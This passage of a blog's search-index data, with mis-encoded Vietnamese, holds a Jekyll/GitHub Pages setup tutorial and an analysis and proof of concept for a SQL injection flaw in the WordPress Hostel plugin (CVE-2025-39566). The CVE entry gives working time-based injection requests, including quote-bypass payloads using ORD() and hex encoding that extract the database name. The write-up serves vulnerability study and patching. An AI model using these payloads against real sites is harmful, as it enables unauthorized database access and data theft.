nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ 